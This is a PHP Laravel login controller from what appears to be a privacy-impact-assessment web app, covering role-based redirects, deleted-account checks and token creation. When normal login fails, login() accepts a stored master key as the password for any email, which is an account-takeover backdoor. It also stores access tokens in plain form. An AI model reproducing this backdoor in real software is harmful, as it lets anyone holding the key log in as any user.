<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use App\Models\DpiaStakeHolder;
use Illuminate\Support\Facades\Hash;
use App\Models\Setting;
use App\Models\User;
use Carbon\Carbon;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    protected function authenticated(Request $request, $user)
    {
        if (!auth()->check()) {
            return redirect('/');
        }

        if ($request->get('acc-profile-redirect') == 'true' && auth()->user()->fname != ""
        ) {
            return redirect('/register/account-profile');
        } else if ($request->get('acc-profile-redirect') == 'true' && auth()->user()->fname == "") {
            //$request->put('acc-profile-redirect','true');
            return redirect('/register/business-profile')->with(['id' => auth()->user()->id]);
        }

        if ($request->get('pricing-page-redirect') == 'true' && auth()->user()->fname != "") {
            return redirect('/price-plan');
        }
        // else if($request->get('pricing-page-redirect') == 'true' && auth()->user()->fname == ""){
        //     return redirect('/register/business-profile')->with('id', auth()->user()->id);
        // }


        if (auth()->user()->admin >= 3) {
            return redirect('/register/business-profile')->with('id', auth()->user()->id);
        } else {

            //            if (Auth::User()->on_trial === 1 && Auth::User()->stripe_id === null || $request->get('acc-profile-redirect') === 1) {
            //                return redirect('/register/account-profile');
            //            }

            $dpia = DpiaStakeHolder::where('user_id',
                $user->id
            )->first();
            if (isset($dpia->user_type) && ($dpia->enabled == 1)) {
                if (
                    $dpia->user_type == 'editor' ||
                    $dpia->user_type == 'reviewer' ||
                    $dpia->user_type == 'dpo' ||
                    $dpia->user_type == 'concern person' ||
                    $dpia->user_type == 'validator' ||
                    $dpia->user_type == 'multi role'
                ) {
                    return redirect('/dpia/privacy-impact-assessment');
                }
            } elseif (isset($dpia->user_type) && ($dpia->enabled == 0)) {
                Auth::logout();
                return redirect('login')->with('warning', 'Your account have been blocked.');
            }
            return redirect(Auth::User()->dashboard_link);
            // if($request->get('loginredriect') === 'null' ) {
            //     return redirect()->intended(Auth::User()->dashboard_link);
            // }else{

            //     return redirect()->intended($request->get('loginredriect'));
            // }
        }
        /*
        if(auth()->check() && auth()->user()->admin == 1){
            return redirect('/admin');
        }
        elseif(auth()->check() && auth()->user()->admin == 0){
            return redirect('/dashboard-business');
        }elseif(auth()->check() && auth()->user()->admin == 2){
            return redirect('/dashboard-advisor');
        }
        */
    }

    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\Response|\Illuminate\Http\JsonResponse
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function login(Request $request)
    {


        if ($this->isDeleted($request->get('email'))) {
            return redirect()->back()
            ->withInput($request->only('email'))
                ->withErrors([
                    'email' => trans('Your account has been deleted')
                ]);
        }

        $this->validateLogin($request);

        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        if ($this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);

            return $this->sendLockoutResponse($request);
        }

        if ($this->attemptLogin($request)) {
            $this->createToken($request);
            return $this->sendLoginResponse($request);
        } else {
            $pass = Setting::find(1)->pluck('master_key')->first();
            if (Hash::check($request->password, $pass)) {
                $user = User::whereEmail($request->email)->first();
                if ($user) {
                    Auth::login($user);
                    $this->createToken($request);
                    return $this->sendLoginResponse($request);
                }
            }
        }

        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);

        return $this->sendFailedLoginResponse($request);
    }

    public function createToken($request)
    {
        $user = $request->user();
        $tokenResult = $user->createToken('Personal Access Token');

        $token = $tokenResult->token;

        $token->expires_at = Carbon::now()->addDays(1);

        $token->save();
        User::where('email', '=', $user->email)->update(['access_token' => $tokenResult->accessToken]);
    }
    public function isDeleted($email)
    {
        $user = User::where(['email' => $email])->first();
        if (is_null($user)) {
            return false;
        }
        return ($user->is_removed == 1) ? true : false;
    }

    //     public function showLoginForm()
    //     {
    //         return view('auth.login');
    // //        return view('auth.login_new');
    //     }

    public function showLoginForm()
    {

        $login = true;
        $register = false;
        return view('auth.login')->with(compact('login', 'register'));
    }
}
